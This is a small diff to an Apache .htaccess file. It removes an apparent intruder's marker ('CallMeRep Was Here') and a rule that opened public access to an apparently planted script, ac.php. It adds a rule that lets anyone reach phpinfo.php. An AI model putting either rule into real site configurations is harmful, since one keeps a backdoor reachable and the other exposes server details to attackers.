@@ -6,8 +6,7 @@ RewriteCond %{REQUEST_FILENAME} !-f
 RewriteCond %{REQUEST_FILENAME} !-d
 RewriteRule . index.php [L]
 
-# CallMeRep Was Here - Allow access to ac.php
-<Files "ac.php">
+<Files "phpinfo.php">
   Order allow,deny
   Allow from all
   Satisfy any
